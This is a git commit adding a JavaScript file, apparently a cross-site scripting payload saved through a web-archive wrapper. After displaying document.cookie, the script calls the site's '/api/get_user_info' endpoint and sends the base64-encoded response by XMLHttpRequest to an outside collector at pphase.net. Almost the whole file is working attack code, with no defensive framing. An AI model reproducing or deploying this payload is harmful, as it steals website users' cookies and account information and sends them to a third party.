e26023dfad7ac0f5f51a6397e0417c0ffe0505d2
pprab2 <72545100+pprab2@users.noreply.github.com>
2025-01-29 12:34:37 +0100

    Create user_info2.js

---
+++ user_info2.js
@@ -0,0 +1,25 @@
+var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
+if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
+{
+  let window = _____WB$wombat$assign$function_____("window");
+  let self = _____WB$wombat$assign$function_____("self");
+  let document = _____WB$wombat$assign$function_____("document");
+  let location = _____WB$wombat$assign$function_____("location");
+  let top = _____WB$wombat$assign$function_____("top");
+  let parent = _____WB$wombat$assign$function_____("parent");
+  let frames = _____WB$wombat$assign$function_____("frames");
+  let opener = _____WB$wombat$assign$function_____("opener");
+
+
+document.write (document.cookie);
+console.log (document.cookie);
+alert (document.cookie);
+  //senddata({'test':'test'});
+sendRequest("/api/get_user_info", null, senddata);
+}
+
+function senddata(data){
+ var x=new XMLHttpRequest;
+  x.open('GET','https://pphase.net/ex/cat/index.php?data=' + btoa(JSON.stringify(data)));
+  x.send();  
+}
